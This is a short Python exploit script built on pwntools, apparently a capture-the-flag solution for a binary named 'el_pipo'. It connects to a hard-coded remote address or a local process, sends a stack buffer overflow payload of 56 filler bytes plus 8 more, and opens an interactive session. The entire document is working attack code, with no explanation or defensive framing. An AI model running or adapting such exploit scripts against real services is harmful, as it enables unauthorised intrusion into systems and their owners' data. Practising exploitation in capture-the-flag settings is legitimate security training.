from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./el_pipo")

def start():
    if args.REMOTE:
        return remote("94.237.57.27", 34566)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

offset = 56

payload = b"".join([
    b"A"*offset,
    b"B"*8
])

io.sendline(payload)

io.interactive()
